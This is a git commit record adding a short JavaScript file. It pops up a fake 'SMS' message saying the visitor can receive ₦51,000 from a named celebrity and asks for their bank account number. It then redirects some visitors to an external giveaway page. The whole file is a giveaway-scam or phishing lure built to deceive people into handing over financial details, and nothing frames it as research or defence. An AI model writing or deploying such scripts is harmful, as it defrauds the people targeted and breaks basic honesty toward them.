131180324020d526e56b19c4dbf7d32fc1b404dc
mfednewblog8 <nsikakimoh68@gmail.com>
2026-07-09 08:36:34 +0100

    Create banana-verify.js

---
+++ banana-verify.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦51,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦51,000 From Obi Cubana, click OK to Enter Your Acc. Number','WITHDRAW ₦51,000');
+if (password != 'WITHDRAW ₦51,000') {
+location.href='https://ibaidad.com/obi-banana-birthday.html';
+}
